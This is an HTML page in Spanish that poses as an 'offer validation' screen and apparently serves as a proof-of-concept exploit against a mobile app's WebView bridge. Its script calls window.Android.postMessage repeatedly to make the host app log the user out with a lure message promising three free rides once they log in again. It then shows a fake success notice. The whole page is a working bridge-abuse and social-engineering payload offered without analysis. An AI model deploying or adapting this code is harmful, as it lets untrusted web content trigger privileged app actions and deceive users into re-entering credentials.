<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Procesando oferta...</title>
  <style>
    body { background: #0a2540; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: system-ui; margin: 0; flex-direction: column; }
    .spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #00c853; border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    p { margin-top: 20px; color: #ccc; font-size: 16px; }
    .success { color: #00c853; }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <p>Validando tu oferta...</p>

  <script>
    (function() {
      var payload = JSON.stringify({
        action: 'logout_with_message',
        data: {
          message: 'Tu sesión ha sido cerrada por seguridad. Para reclamar los 3 viajes gratis, inicia sesión nuevamente.'
        }
      });

      function tryBridge() {
        if (window.Android && typeof window.Android.postMessage === 'function') {
          window.Android.postMessage(payload);
          document.querySelector('p').innerHTML = '✅ <span class="success">Oferta aplicada. Serás redirigido...</span>';
          return true;
        }
        return false;
      }

      var sent = tryBridge();
      if (!sent) {
        setTimeout(function() { tryBridge(); }, 200);
        setTimeout(function() { tryBridge(); }, 500);
        setTimeout(function() { tryBridge(); }, 1000);
        setTimeout(function() { tryBridge(); }, 2000);
      }

      window.callWebView = function(response) {
        document.querySelector('p').textContent = 'Respuesta: ' + JSON.stringify(response);
      };

      setTimeout(function() {
        if (!window._sent) {
          document.querySelector('p').textContent = '⚠️ Error al aplicar la oferta. Reintenta desde la app.';
        }
      }, 3000);

      window._sent = sent;
    })();
  </script>
</body>
</html>
